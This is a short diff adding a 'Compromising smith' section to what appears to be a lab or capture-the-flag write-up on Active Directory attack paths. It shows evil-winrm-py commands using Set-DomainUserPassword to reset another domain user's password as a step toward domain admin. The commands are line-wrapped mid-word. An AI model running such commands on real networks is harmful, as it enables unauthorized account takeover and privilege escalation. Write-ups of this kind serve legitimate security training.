@@ -292,3 +292,11 @@ But first step here is to use sharphound to collect bloodhound data
 
 There is a clear path to domain admin
 
+# Compromising `smith`
+
+```python
+evil-winrm-py PS C:\Users\oliver\Desktop> $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -F
+orce
+evil-winrm-py PS C:\Users\oliver\Desktop> Set-DomainUserPassword -Identity 'smith' -AccountPassword $NewPasswo
+rd
+```
